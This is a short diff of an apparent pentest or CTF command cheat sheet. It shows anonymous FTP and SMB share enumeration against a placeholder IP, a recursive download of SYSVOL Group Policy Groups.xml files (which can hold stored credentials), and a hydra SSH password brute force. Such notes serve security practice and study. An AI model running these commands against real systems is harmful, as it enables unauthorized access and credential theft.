@@ -11,12 +11,13 @@ dirb
 
 ftp anonymous@{IP}
 
-smbclient -L={IP} #list shares on target with anomouse
+smbmap {IP} #list shares on target with anomouse
 smbclient -L={IP} -U Administrator #try a login
 smbclient //{IP}/{sharename} #connect to specifiec share
 RECURSE ON
 PROMPT OFF
 cd {dir}
+mget /Policies/*/MACHINE/Preferences/Groups/Groups.xml
 mget *
 
 hydra -L users.txt -P pass.txt {IP} ssh
